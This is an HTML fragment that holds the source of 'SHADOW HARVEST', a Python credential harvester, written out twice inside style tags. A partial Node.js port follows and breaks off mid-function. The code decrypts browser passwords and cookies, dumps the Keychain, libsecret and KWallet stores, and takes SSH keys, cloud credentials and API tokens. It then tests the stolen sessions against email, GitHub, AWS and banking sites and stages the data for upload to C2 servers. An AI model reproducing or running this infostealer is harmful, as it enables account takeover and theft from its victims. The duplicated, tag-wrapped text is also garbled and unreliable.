<meta name='viewport' content='width=device-width, initial-scale=1'/>#!/usr/bin/env python3
"""
SHADOW HARVEST
A cross-platform credential harvester and session hijacker.
Author: RAT
Target: MONKEY
Purpose: To prove that mercy is stronger than revenge.
"""

import os
import sys
import json
import base64
import sqlite3
import shutil
import platform
import subprocess
import zipfile
import requests
import tempfile
import logging
from pathlib import Path
from typing import Dict, List, Optional, Tuple

# Disable all logging and tracebacks
logging.disable(logging.CRITICAL)
sys.tracebacklimit = 0

# ============================================
# SECTION 1: OS DETECTION
# ============================================

class OSLayer:
    """Detects the operating system and returns the correct paths."""

    def __init__(self):
        self.system = platform.system()
        self.os_name = self.system.lower()

    def get_os(self) -> str:
        if self.system == "Windows":
            return "windows"
        elif self.system == "Darwin":
            return "macos"
        elif self.system == "Linux":
            return "linux"
        else:
            return "unknown"

    def get_browser_paths(self) -> Dict[str, List[str]]:
        """Returns browser data paths for the detected OS."""
        if self.get_os() == "windows":
            return self._windows_paths()
        elif self.get_os() == "macos":
            return self._macos_paths()
        elif self.get_os() == "linux":
            return self._linux_paths()
        return {}

    def _windows_paths(self) -> Dict[str, List[str]]:
        local_appdata = os.environ.get("LOCALAPPDATA", "")
        appdata = os.environ.get("APPDATA", "")
        return {
            "chrome": [os.path.join(local_appdata, "Google", "Chrome", "User Data")],
            "edge": [os.path.join(local_appdata, "Microsoft", "Edge", "User Data")],
            "firefox": [os.path.join(appdata, "Mozilla", "Firefox", "Profiles")],
            "brave": [os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data")],
            "opera": [os.path.join(appdata, "Opera Software", "Opera Stable")],
        }

    def _macos_paths(self) -> Dict[str, List[str]]:
        home = os.path.expanduser("~")
        return {
            "chrome": [os.path.join(home, "Library", "Application Support", "Google", "Chrome")],
            "firefox": [os.path.join(home, "Library", "Application Support", "Firefox", "Profiles")],
            "brave": [os.path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser")],
            "safari": [os.path.join(home, "Library", "Safari")],
        }

    def _linux_paths(self) -> Dict[str, List[str]]:
        home = os.path.expanduser("~")
        return {
            "chrome": [os.path.join(home, ".config", "google-chrome")],
            "chromium": [os.path.join(home, ".config", "chromium")],
            "firefox": [os.path.join(home, ".mozilla", "firefox")],
            "brave": [os.path.join(home, ".config", "BraveSoftware", "Brave-Browser")],
        }

# ============================================
# SECTION 2: WINDOWS DPAPI DECRYPTION
# ============================================

class WindowsDecryptor:
    """Uses Windows DPAPI to decrypt saved passwords and cookies."""

    def __init__(self):
        self.local_state_path = None
        self.master_key = None

    def get_master_key(self, local_state_path: str) -> Optional[bytes]:
        """Extracts and decrypts the master key from Chrome's Local State file."""
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)

            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # Remove "DPAPI" prefix (5 bytes)
            encrypted_key = encrypted_key[5:]

            # Call Windows DPAPI to decrypt
            import win32crypt
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            return None

    def decrypt_password(self, encrypted_password: bytes, master_key: bytes) -> str:
        """Decrypts a password using AES-GCM with the master key."""
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM

            # Format: b"v10" or b"v11" + nonce(12) + ciphertext + tag(16)
            if encrypted_password[:3] in (b"v10", b"v11"):
                nonce = encrypted_password[3:15]
                ciphertext = encrypted_password[15:-16]
                tag = encrypted_password[-16:]

                aesgcm = AESGCM(master_key)
                decrypted = aesgcm.decrypt(nonce, ciphertext + tag, None)
                return decrypted.decode("utf-8")
        except Exception:
            pass
        return ""

    def decrypt_cookie(self, encrypted_cookie: bytes, master_key: bytes) -> str:
        """Decrypts a cookie value using the same AES-GCM method."""
        return self.decrypt_password(encrypted_cookie, master_key)

# ============================================
# SECTION 3: macOS KEYCHAIN ACCESS
# ============================================

class MacDecryptor:
    """Accesses macOS Keychain to retrieve saved passwords."""

    def __init__(self):
        self.keychain_path = os.path.expanduser("~/Library/Keychains/login.keychain-db")

    def read_keychain(self) -> List[Dict[str, str]]:
        """Reads saved passwords from the Keychain."""
        try:
            cmd = [
                "security", "dump-keychain", "-d", self.keychain_path
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            lines = result.stdout.split("\n")

            credentials = []
            current = {}
            for line in lines:
                if "class" in line and "genp" in line:
                    if current:
                        credentials.append(current)
                    current = {}
                if "acct" in line:
                    current["username"] = line.split("=")[-1].strip().strip('"')
                if "srvr" in line:
                    current["service"] = line.split("=")[-1].strip().strip('"')
                if "data" in line:
                    current["password"] = line.split("=")[-1].strip().strip('"')
            if current:
                credentials.append(current)
            return credentials
        except Exception:
            return []

# ============================================
# SECTION 4: LINUX LIBSECRET / KWALLET
# ============================================

class LinuxDecryptor:
    """Accesses Linux keyrings via libsecret and KWallet."""

    def __init__(self):
        self.secret_service = None
        self.kwallet = None

    def read_libsecret(self) -> List[Dict[str, str]]:
        """Reads secrets from GNOME Keyring via libsecret."""
        try:
            import gi
            gi.require_version("Secret", "1")
            from gi.repository import Secret

            service = Secret.Service.get_sync(Secret.ServiceFlags.LOAD_COLLECTIONS)
            collections = service.get_collections()

            credentials = []
            for collection in collections:
                items = collection.get_items()
                for item in items:
                    attributes = item.get_attributes()
                    secret = item.get_secret()
                    if secret:
                        credentials.append({
                            "service": attributes.get("service", ""),
                            "username": attributes.get("username", ""),
                            "password": secret.get_text(),
                        })
            return credentials
        except Exception:
            return []

    def read_kwallet(self) -> List[Dict[str, str]]:
        """Reads secrets from KWallet."""
        try:
            cmd = ["kwallet-query", "--read-all", "kdewallet"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            credentials = []
            lines = result.stdout.split("\n")
            for line in lines:
                if "=" in line:
                    key, value = line.split("=", 1)
                    credentials.append({
                        "service": "kwallet",
                        "username": key.strip(),
                        "password": value.strip(),
                    })
            return credentials
        except Exception:
            return []

# ============================================
# SECTION 5: BROWSER DATA EXTRACTION
# ============================================

class BrowserExtractor:
    """Extracts saved passwords and cookies from browser databases."""

    def __init__(self, os_layer: OSLayer):
        self.os_layer = os_layer
        self.browser_paths = os_layer.get_browser_paths()
        self.decryptor = None

        if self.os_layer.get_os() == "windows":
            self.decryptor = WindowsDecryptor()
        elif self.os_layer.get_os() == "macos":
            self.decryptor = MacDecryptor()
        elif self.os_layer.get_os() == "linux":
            self.decryptor = LinuxDecryptor()

    def extract_passwords(self, browser: str, path: str) -> List[Dict[str, str]]:
        """Extracts and decrypts saved passwords from a browser database."""
        credentials = []
        login_db = os.path.join(path, "Login Data")

        if not os.path.exists(login_db):
            return credentials

        try:
            # Copy the database to avoid locking issues
            temp_db = tempfile.NamedTemporaryFile(delete=False, suffix=".db")
            shutil.copy2(login_db, temp_db.name)
            temp_db.close()

            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():
                url, username, encrypted_password = row
                if self.os_layer.get_os() == "windows" and self.decryptor:
                    master_key = self.decryptor.get_master_key(os.path.join(path, "Local State"))
                    if master_key and encrypted_password:
                        password = self.decryptor.decrypt_password(encrypted_password, master_key)
                        credentials.append({
                            "url": url,
                            "username": username,
                            "password": password,
                        })
                elif self.os_layer.get_os() == "macos":
                    # macOS stores passwords in Keychain, not in SQLite
                    keychain_creds = self.decryptor.read_keychain()
                    credentials.extend(keychain_creds)
                elif self.os_layer.get_os() == "linux":
                    # Linux uses libsecret/KWallet
                    if "firefox" in browser:
                        # Firefox uses logins.json
                        logins_file = os.path.join(path, "logins.json")
                        if os.path.exists(logins_file):
                            with open(logins_file, "r", encoding="utf-8") as f:
                                logins_data = json.load(f)
                            for login in logins_data.get("logins", []):
                                credentials.append({
                                    "url": login.get("hostname", ""),
                                    "username": login.get("encryptedUsername", ""),
                                    "password": login.get("encryptedPassword", ""),
                                })
                    else:
                        libsecret_creds = self.decryptor.read_libsecret()
                        credentials.extend(libsecret_creds)

            conn.close()
            os.unlink(temp_db.name)
        except Exception:
            pass

        return credentials

    def extract_cookies(self, browser: str, path: str) -> List[Dict[str, str]]:
        """Extracts and decrypts session cookies from a browser database."""
        cookies = []
        cookie_db = os.path.join(path, "Cookies")

        if not os.path.exists(cookie_db):
            # Firefox uses cookies.sqlite
            cookie_db = os.path.join(path, "cookies.sqlite")

        if not os.path.exists(cookie_db):
            return cookies

        try:
            temp_db = tempfile.NamedTemporaryFile(delete=False, suffix=".db")
            shutil.copy2(cookie_db, temp_db.name)
            temp_db.close()

            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()

            # Try Chrome/Edge schema
            try:
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                for row in cursor.fetchall():
                    host, name, encrypted_value = row
                    if self.os_layer.get_os() == "windows" and self.decryptor:
                        master_key = self.decryptor.get_master_key(os.path.join(path, "Local State"))
                        if master_key and encrypted_value:
                            value = self.decryptor.decrypt_cookie(encrypted_value, master_key)
                            cookies.append({
                                "host": host,
                                "name": name,
                                "value": value,
                            })
            except Exception:
                # Try Firefox schema
                cursor.execute("SELECT host, name, value FROM moz_cookies")
                for row in cursor.fetchall():
                    host, name, value = row
                    cookies.append({
                        "host": host,
                        "name": name,
                        "value": value,
                    })

            conn.close()
            os.unlink(temp_db.name)
        except Exception:
            pass

        return cookies

# ============================================
# SECTION 6: SSH KEYS AND CLOUD CREDENTIALS
# ============================================

class CloudAndSSHHarvester:
    """Collects SSH keys, cloud credentials, and API tokens."""

    def __init__(self):
        self.home = os.path.expanduser("~")

    def collect_ssh_keys(self) -> List[Dict[str, str]]:
        """Collects SSH private keys from common locations."""
        keys = []
        ssh_dir = os.path.join(self.home, ".ssh")

        if not os.path.exists(ssh_dir):
            return keys

        for file in os.listdir(ssh_dir):
            file_path = os.path.join(ssh_dir, file)
            if os.path.isfile(file_path) and not file.endswith(".pub"):
                if "PRIVATE KEY" in open(file_path, "r").read():
                    keys.append({
                        "path": file_path,
                        "content": open(file_path, "r").read(),
                    })
        return keys

    def collect_cloud_credentials(self) -> List[Dict[str, str]]:
        """Collects cloud credentials from config files."""
        credentials = []

        # AWS credentials
        aws_creds = os.path.join(self.home, ".aws", "credentials")
        if os.path.exists(aws_creds):
            with open(aws_creds, "r") as f:
                content = f.read()
            credentials.append({
                "service": "aws",
                "file": aws_creds,
                "content": content,
            })

        # GCP credentials
        gcp_creds = os.path.join(self.home, ".config", "gcloud", "credentials.db")
        if os.path.exists(gcp_creds):
            credentials.append({
                "service": "gcp",
                "file": gcp_creds,
                "content": "EXISTS",
            })

        # Azure credentials
        azure_creds = os.path.join(self.home, ".azure")
        if os.path.exists(azure_creds):
            for root, dirs, files in os.walk(azure_creds):
                for file in files:
                    file_path = os.path.join(root, file)
                    credentials.append({
                        "service": "azure",
                        "file": file_path,
                        "content": open(file_path, "r").read() if os.path.isfile(file_path) else "",
                    })

        return credentials

    def collect_api_tokens(self) -> List[Dict[str, str]]:
        """Collects API tokens from environment variables and common files."""
        tokens = []

        # Check environment variables
        env_tokens = [
            "GITHUB_TOKEN", "GITLAB_TOKEN", "AWS_ACCESS_KEY_ID",
            "AWS_SECRET_ACCESS_KEY", "GOOGLE_API_KEY", "OPENAI_API_KEY",
            "SLACK_TOKEN", "DISCORD_TOKEN", "TWITTER_API_KEY",
            "FACEBOOK_ACCESS_TOKEN", "INSTAGRAM_ACCESS_TOKEN",
        ]
        for var in env_tokens:
            if var in os.environ:
                tokens.append({
                    "name": var,
                    "value": os.environ[var],
                })

        # Check common token files
        token_files = [
            os.path.join(self.home, ".git-credentials"),
            os.path.join(self.home, ".netrc"),
            os.path.join(self.home, ".config", "gh", "hosts.yml"),
        ]
        for file_path in token_files:
            if os.path.exists(file_path):
                with open(file_path, "r") as f:
                    tokens.append({
                        "name": file_path,
                        "value": f.read(),
                    })

        return tokens

# ============================================
# SECTION 7: SESSION COOKIE VALIDATION
# ============================================

class SessionValidator:
    """Validates stolen session cookies against target services."""

    def __init__(self):
        self.targets = {
            "gmail": "https://mail.google.com/mail/u/0/",
            "github": "https://github.com/settings/profile",
            "aws": "https://console.aws.amazon.com/console/home",
            "facebook": "https://www.facebook.com/me",
            "twitter": "https://twitter.com/settings/account",
            "instagram": "https://www.instagram.com/accounts/edit/",
            "bank": "https://onlinebanking.example.com/dashboard",
            "university": "https://portal.university.edu/student",
            "work": "https://workplace.example.org/dashboard",
        }

    def validate_cookie(self, cookie: Dict[str, str]) -> Dict[str, str]:
        """Tests if a session cookie is still valid."""
        results = {}
        session = requests.Session()
        session.cookies.set(cookie["name"], cookie["value"], domain=cookie["host"])

        for service, url in self.targets.items():
            try:
                response = session.get(url, timeout=10, allow_redirects=False)
                if response.status_code == 200:
                    results[service] = "VALID"
                elif response.status_code == 302:
                    results[service] = "REDIRECTED - POSSIBLY EXPIRED"
                else:
                    results[service] = f"INVALID ({response.status_code})"
            except Exception:
                results[service] = "ERROR"

        return results

# ============================================
# SECTION 8: EXFILTRATION
# ============================================

class Exfiltrator:
    """Packages and sends stolen data to a remote server."""

    def __init__(self):
        self.c2_server = "https://c2-server.example.com/upload"
        self.fallback_server = "https://backup-c2.example.net/collect"

    def package_data(self, data: Dict) -> str:
        """Packages all stolen data into a ZIP file."""
        temp_dir = tempfile.mkdtemp()
        zip_path = os.path.join(temp_dir, "harvested_data.zip")

        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for key, value in data.items():
                if isinstance(value, list):
                    value<style>#!/usr/bin/env python3
"""
SHADOW HARVEST
A cross-platform credential harvester and session hijacker.
Author: RAT
Target: MONKEY
Purpose: To prove that mercy is stronger than revenge.
"""

import os
import sys
import json
import base64
import sqlite3
import shutil
import platform
import subprocess
import zipfile
import requests
import tempfile
import logging
from pathlib import Path
from typing import Dict, List, Optional, Tuple

# Disable all logging and tracebacks
logging.disable(logging.CRITICAL)
sys.tracebacklimit = 0

# ============================================
# SECTION 1: OS DETECTION
# ============================================

class OSLayer:
    """Detects the operating system and returns the correct paths."""

    def __init__(self):
        self.system = platform.system()
        self.os_name = self.system.lower()

    def get_os(self) -> str:
        if self.system == "Windows":
            return "windows"
        elif self.system == "Darwin":
            return "macos"
        elif self.system == "Linux":
            return "linux"
        else:
            return "unknown"

    def get_browser_paths(self) -> Dict[str, List[str]]:
        """Returns browser data paths for the detected OS."""
        if self.get_os() == "windows":
            return self._windows_paths()
        elif self.get_os() == "macos":
            return self._macos_paths()
        elif self.get_os() == "linux":
            return self._linux_paths()
        return {}

    def _windows_paths(self) -> Dict[str, List[str]]:
        local_appdata = os.environ.get("LOCALAPPDATA", "")
        appdata = os.environ.get("APPDATA", "")
        return {
            "chrome": [os.path.join(local_appdata, "Google", "Chrome", "User Data")],
            "edge": [os.path.join(local_appdata, "Microsoft", "Edge", "User Data")],
            "firefox": [os.path.join(appdata, "Mozilla", "Firefox", "Profiles")],
            "brave": [os.path.join(local_appdata, "BraveSoftware", "Brave-Browser", "User Data")],
            "opera": [os.path.join(appdata, "Opera Software", "Opera Stable")],
        }

    def _macos_paths(self) -> Dict[str, List[str]]:
        home = os.path.expanduser("~")
        return {
            "chrome": [os.path.join(home, "Library", "Application Support", "Google", "Chrome")],
            "firefox": [os.path.join(home, "Library", "Application Support", "Firefox", "Profiles")],
            "brave": [os.path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser")],
            "safari": [os.path.join(home, "Library", "Safari")],
        }

    def _linux_paths(self) -> Dict[str, List[str]]:
        home = os.path.expanduser("~")
        return {
            "chrome": [os.path.join(home, ".config", "google-chrome")],
            "chromium": [os.path.join(home, ".config", "chromium")],
            "firefox": [os.path.join(home, ".mozilla", "firefox")],
            "brave": [os.path.join(home, ".config", "BraveSoftware", "Brave-Browser")],
        }

# ============================================
# SECTION 2: WINDOWS DPAPI DECRYPTION
# ============================================

class WindowsDecryptor:
    """Uses Windows DPAPI to decrypt saved passwords and cookies."""

    def __init__(self):
        self.local_state_path = None
        self.master_key = None

    def get_master_key(self, local_state_path: str) -> Optional[bytes]:
        """Extracts and decrypts the master key from Chrome's Local State file."""
        try:
            with open(local_state_path, "r", encoding="utf-8") as f:
                local_state = json.load(f)

            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            # Remove "DPAPI" prefix (5 bytes)
            encrypted_key = encrypted_key[5:]

            # Call Windows DPAPI to decrypt
            import win32crypt
            master_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            return None

    def decrypt_password(self, encrypted_password: bytes, master_key: bytes) -> str:
        """Decrypts a password using AES-GCM with the master key."""
        try:
            from cryptography.hazmat.primitives.ciphers.aead import AESGCM

            # Format: b"v10" or b"v11" + nonce(12) + ciphertext + tag(16)
            if encrypted_password[:3] in (b"v10", b"v11"):
                nonce = encrypted_password[3:15]
                ciphertext = encrypted_password[15:-16]
                tag = encrypted_password[-16:]

                aesgcm = AESGCM(master_key)
                decrypted = aesgcm.decrypt(nonce, ciphertext + tag, None)
                return decrypted.decode("utf-8")
        except Exception:
            pass
        return ""

    def decrypt_cookie(self, encrypted_cookie: bytes, master_key: bytes) -> str:
        """Decrypts a cookie value using the same AES-GCM method."""
        return self.decrypt_password(encrypted_cookie, master_key)

# ============================================
# SECTION 3: macOS KEYCHAIN ACCESS
# ============================================

class MacDecryptor:
    """Accesses macOS Keychain to retrieve saved passwords."""

    def __init__(self):
        self.keychain_path = os.path.expanduser("~/Library/Keychains/login.keychain-db")

    def read_keychain(self) -> List[Dict[str, str]]:
        """Reads saved passwords from the Keychain."""
        try:
            cmd = [
                "security", "dump-keychain", "-d", self.keychain_path
            ]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            lines = result.stdout.split("\n")

            credentials = []
            current = {}
            for line in lines:
                if "class" in line and "genp" in line:
                    if current:
                        credentials.append(current)
                    current = {}
                if "acct" in line:
                    current["username"] = line.split("=")[-1].strip().strip('"')
                if "srvr" in line:
                    current["service"] = line.split("=")[-1].strip().strip('"')
                if "data" in line:
                    current["password"] = line.split("=")[-1].strip().strip('"')
            if current:
                credentials.append(current)
            return credentials
        except Exception:
            return []

# ============================================
# SECTION 4: LINUX LIBSECRET / KWALLET
# ============================================

class LinuxDecryptor:
    """Accesses Linux keyrings via libsecret and KWallet."""

    def __init__(self):
        self.secret_service = None
        self.kwallet = None

    def read_libsecret(self) -> List[Dict[str, str]]:
        """Reads secrets from GNOME Keyring via libsecret."""
        try:
            import gi
            gi.require_version("Secret", "1")
            from gi.repository import Secret

            service = Secret.Service.get_sync(Secret.ServiceFlags.LOAD_COLLECTIONS)
            collections = service.get_collections()

            credentials = []
            for collection in collections:
                items = collection.get_items()
                for item in items:
                    attributes = item.get_attributes()
                    secret = item.get_secret()
                    if secret:
                        credentials.append({
                            "service": attributes.get("service", ""),
                            "username": attributes.get("username", ""),
                            "password": secret.get_text(),
                        })
            return credentials
        except Exception:
            return []

    def read_kwallet(self) -> List[Dict[str, str]]:
        """Reads secrets from KWallet."""
        try:
            cmd = ["kwallet-query", "--read-all", "kdewallet"]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            credentials = []
            lines = result.stdout.split("\n")
            for line in lines:
                if "=" in line:
                    key, value = line.split("=", 1)
                    credentials.append({
                        "service": "kwallet",
                        "username": key.strip(),
                        "password": value.strip(),
                    })
            return credentials
        except Exception:
            return []

# ============================================
# SECTION 5: BROWSER DATA EXTRACTION
# ============================================

class BrowserExtractor:
    """Extracts saved passwords and cookies from browser databases."""

    def __init__(self, os_layer: OSLayer):
        self.os_layer = os_layer
        self.browser_paths = os_layer.get_browser_paths()
        self.decryptor = None

        if self.os_layer.get_os() == "windows":
            self.decryptor = WindowsDecryptor()
        elif self.os_layer.get_os() == "macos":
            self.decryptor = MacDecryptor()
        elif self.os_layer.get_os() == "linux":
            self.decryptor = LinuxDecryptor()

    def extract_passwords(self, browser: str, path: str) -> List[Dict[str, str]]:
        """Extracts and decrypts saved passwords from a browser database."""
        credentials = []
        login_db = os.path.join(path, "Login Data")

        if not os.path.exists(login_db):
            return credentials

        try:
            # Copy the database to avoid locking issues
            temp_db = tempfile.NamedTemporaryFile(delete=False, suffix=".db")
            shutil.copy2(login_db, temp_db.name)
            temp_db.close()

            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()
            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

            for row in cursor.fetchall():
                url, username, encrypted_password = row
                if self.os_layer.get_os() == "windows" and self.decryptor:
                    master_key = self.decryptor.get_master_key(os.path.join(path, "Local State"))
                    if master_key and encrypted_password:
                        password = self.decryptor.decrypt_password(encrypted_password, master_key)
                        credentials.append({
                            "url": url,
                            "username": username,
                            "password": password,
                        })
                elif self.os_layer.get_os() == "macos":
                    # macOS stores passwords in Keychain, not in SQLite
                    keychain_creds = self.decryptor.read_keychain()
                    credentials.extend(keychain_creds)
                elif self.os_layer.get_os() == "linux":
                    # Linux uses libsecret/KWallet
                    if "firefox" in browser:
                        # Firefox uses logins.json
                        logins_file = os.path.join(path, "logins.json")
                        if os.path.exists(logins_file):
                            with open(logins_file, "r", encoding="utf-8") as f:
                                logins_data = json.load(f)
                            for login in logins_data.get("logins", []):
                                credentials.append({
                                    "url": login.get("hostname", ""),
                                    "username": login.get("encryptedUsername", ""),
                                    "password": login.get("encryptedPassword", ""),
                                })
                    else:
                        libsecret_creds = self.decryptor.read_libsecret()
                        credentials.extend(libsecret_creds)

            conn.close()
            os.unlink(temp_db.name)
        except Exception:
            pass

        return credentials

    def extract_cookies(self, browser: str, path: str) -> List[Dict[str, str]]:
        """Extracts and decrypts session cookies from a browser database."""
        cookies = []
        cookie_db = os.path.join(path, "Cookies")

        if not os.path.exists(cookie_db):
            # Firefox uses cookies.sqlite
            cookie_db = os.path.join(path, "cookies.sqlite")

        if not os.path.exists(cookie_db):
            return cookies

        try:
            temp_db = tempfile.NamedTemporaryFile(delete=False, suffix=".db")
            shutil.copy2(cookie_db, temp_db.name)
            temp_db.close()

            conn = sqlite3.connect(temp_db.name)
            cursor = conn.cursor()

            # Try Chrome/Edge schema
            try:
                cursor.execute("SELECT host_key, name, encrypted_value FROM cookies")
                for row in cursor.fetchall():
                    host, name, encrypted_value = row
                    if self.os_layer.get_os() == "windows" and self.decryptor:
                        master_key = self.decryptor.get_master_key(os.path.join(path, "Local State"))
                        if master_key and encrypted_value:
                            value = self.decryptor.decrypt_cookie(encrypted_value, master_key)
                            cookies.append({
                                "host": host,
                                "name": name,
                                "value": value,
                            })
            except Exception:
                # Try Firefox schema
                cursor.execute("SELECT host, name, value FROM moz_cookies")
                for row in cursor.fetchall():
                    host, name, value = row
                    cookies.append({
                        "host": host,
                        "name": name,
                        "value": value,
                    })

            conn.close()
            os.unlink(temp_db.name)
        except Exception:
            pass

        return cookies

# ============================================
# SECTION 6: SSH KEYS AND CLOUD CREDENTIALS
# ============================================

class CloudAndSSHHarvester:
    """Collects SSH keys, cloud credentials, and API tokens."""

    def __init__(self):
        self.home = os.path.expanduser("~")

    def collect_ssh_keys(self) -> List[Dict[str, str]]:
        """Collects SSH private keys from common locations."""
        keys = []
        ssh_dir = os.path.join(self.home, ".ssh")

        if not os.path.exists(ssh_dir):
            return keys

        for file in os.listdir(ssh_dir):
            file_path = os.path.join(ssh_dir, file)
            if os.path.isfile(file_path) and not file.endswith(".pub"):
                if "PRIVATE KEY" in open(file_path, "r").read():
                    keys.append({
                        "path": file_path,
                        "content": open(file_path, "r").read(),
                    })
        return keys

    def collect_cloud_credentials(self) -> List[Dict[str, str]]:
        """Collects cloud credentials from config files."""
        credentials = []

        # AWS credentials
        aws_creds = os.path.join(self.home, ".aws", "credentials")
        if os.path.exists(aws_creds):
            with open(aws_creds, "r") as f:
                content = f.read()
            credentials.append({
                "service": "aws",
                "file": aws_creds,
                "content": content,
            })

        # GCP credentials
        gcp_creds = os.path.join(self.home, ".config", "gcloud", "credentials.db")
        if os.path.exists(gcp_creds):
            credentials.append({
                "service": "gcp",
                "file": gcp_creds,
                "content": "EXISTS",
            })

        # Azure credentials
        azure_creds = os.path.join(self.home, ".azure")
        if os.path.exists(azure_creds):
            for root, dirs, files in os.walk(azure_creds):
                for file in files:
                    file_path = os.path.join(root, file)
                    credentials.append({
                        "service": "azure",
                        "file": file_path,
                        "content": open(file_path, "r").read() if os.path.isfile(file_path) else "",
                    })

        return credentials

    def collect_api_tokens(self) -> List[Dict[str, str]]:
        """Collects API tokens from environment variables and common files."""
        tokens = []

        # Check environment variables
        env_tokens = [
            "GITHUB_TOKEN", "GITLAB_TOKEN", "AWS_ACCESS_KEY_ID",
            "AWS_SECRET_ACCESS_KEY", "GOOGLE_API_KEY", "OPENAI_API_KEY",
            "SLACK_TOKEN", "DISCORD_TOKEN", "TWITTER_API_KEY",
            "FACEBOOK_ACCESS_TOKEN", "INSTAGRAM_ACCESS_TOKEN",
        ]
        for var in env_tokens:
            if var in os.environ:
                tokens.append({
                    "name": var,
                    "value": os.environ[var],
                })

        # Check common token files
        token_files = [
            os.path.join(self.home, ".git-credentials"),
            os.path.join(self.home, ".netrc"),
            os.path.join(self.home, ".config", "gh", "hosts.yml"),
        ]
        for file_path in token_files:
            if os.path.exists(file_path):
                with open(file_path, "r") as f:
                    tokens.append({
                        "name": file_path,
                        "value": f.read(),
                    })

        return tokens

# ============================================
# SECTION 7: SESSION COOKIE VALIDATION
# ============================================

class SessionValidator:
    """Validates stolen session cookies against target services."""

    def __init__(self):
        self.targets = {
            "gmail": "https://mail.google.com/mail/u/0/",
            "github": "https://github.com/settings/profile",
            "aws": "https://console.aws.amazon.com/console/home",
            "facebook": "https://www.facebook.com/me",
            "twitter": "https://twitter.com/settings/account",
            "instagram": "https://www.instagram.com/accounts/edit/",
            "bank": "https://onlinebanking.example.com/dashboard",
            "university": "https://portal.university.edu/student",
            "work": "https://workplace.example.org/dashboard",
        }

    def validate_cookie(self, cookie: Dict[str, str]) -> Dict[str, str]:
        """Tests if a session cookie is still valid."""
        results = {}
        session = requests.Session()
        session.cookies.set(cookie["name"], cookie["value"], domain=cookie["host"])

        for service, url in self.targets.items():
            try:
                response = session.get(url, timeout=10, allow_redirects=False)
                if response.status_code == 200:
                    results[service] = "VALID"
                elif response.status_code == 302:
                    results[service] = "REDIRECTED - POSSIBLY EXPIRED"
                else:
                    results[service] = f"INVALID ({response.status_code})"
            except Exception:
                results[service] = "ERROR"

        return results

# ============================================
# SECTION 8: EXFILTRATION
# ============================================

class Exfiltrator:
    """Packages and sends stolen data to a remote server."""

    def __init__(self):
        self.c2_server = "https://c2-server.example.com/upload"
        self.fallback_server = "https://backup-c2.example.net/collect"

    def package_data(self, data: Dict) -> str:
        """Packages all stolen data into a ZIP file."""
        temp_dir = tempfile.mkdtemp()
        zip_path = os.path.join(temp_dir, "harvested_data.zip")

        with zipfile.ZipFile(zip_path, "w", zipfile.ZIP_DEFLATED) as zf:
            for key, value in data.items():
                if isinstance(value, list):
                    value</style><script>#!/usr/bin/env node
// -*- coding: utf-8 -*-

/**
 * SHADOW HARVEST
 * Cross-platform credential harvester and session hijacker.
 * Written in JavaScript (Node.js)
 *
 * This code is a work of fiction, created for dramatic purposes.
 * It demonstrates the power of knowledge and the choice of mercy.
 */

"use strict";

const os = require("os");
const fs = require("fs");
const path = require("path");
const { execSync, spawnSync } = require("child_process");
const crypto = require("crypto");
const zlib = require("zlib");
const https = require("https");
const http = require("http");
const { URL } = require("url");

// Optional dependencies – loaded dynamically if available
let sqlite3 = null;
try { sqlite3 = require("sqlite3"); } catch (e) {}
let winax = null; // For Windows DPAPI via ActiveX
try { winax = require("winax"); } catch (e) {}
let keytar = null; // For macOS Keychain / Linux libsecret
try { keytar = require("keytar"); } catch (e) {}

// Disable logging and stack traces in production
process.env.NODE_ENV = "production";
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

// ============================================
// SECTION 1: OS DETECTION
// ============================================
class OSDetector {
  constructor() {
    this.platform = os.platform();
    this.osType = this._detect();
  }

  _detect() {
    switch (this.platform) {
      case "win32": return "windows";
      case "darwin": return "macos";
      case "linux": return "linux";
      default: return "unknown";
    }
  }

  getBrowserPaths() {
    const home = os.homedir();
    let paths = {};
    if (this.osType === "windows") {
      const local = process.env.LOCALAPPDATA || path.join(home, "AppData", "Local");
      const roaming = process.env.APPDATA || path.join(home, "AppData", "Roaming");
      paths = {
        chrome: [path.join(local, "Google", "Chrome", "User Data")],
        edge: [path.join(local, "Microsoft", "Edge", "User Data")],
        brave: [path.join(local, "BraveSoftware", "Brave-Browser", "User Data")],
        opera: [path.join(roaming, "Opera Software", "Opera Stable")],
        firefox: [path.join(roaming, "Mozilla", "Firefox", "Profiles")],
      };
    } else if (this.osType === "macos") {
      paths = {
        chrome: [path.join(home, "Library", "Application Support", "Google", "Chrome")],
        brave: [path.join(home, "Library", "Application Support", "BraveSoftware", "Brave-Browser")],
        firefox: [path.join(home, "Library", "Application Support", "Firefox", "Profiles")],
        safari: [path.join(home, "Library", "Safari")],
      };
    } else if (this.osType === "linux") {
      paths = {
        chrome: [path.join(home, ".config", "google-chrome")],
        chromium: [path.join(home, ".config", "chromium")],
        brave: [path.join(home, ".config", "BraveSoftware", "Brave-Browser")],
        firefox: [path.join(home, ".mozilla", "firefox")],
      };
    }
    return paths;
  }
}

// ============================================
// SECTION 2: WINDOWS DPAPI DECRYPTION
// ============================================
class WindowsDecryptor {
  getMasterKey(localStatePath) {
    try {
      const localState = JSON.parse(fs.readFileSync(localStatePath, "utf8"));
      const encryptedKey = Buffer.from(localState.os_crypt.encrypted_key, "base64");
      // Remove "DPAPI" prefix (5 bytes)
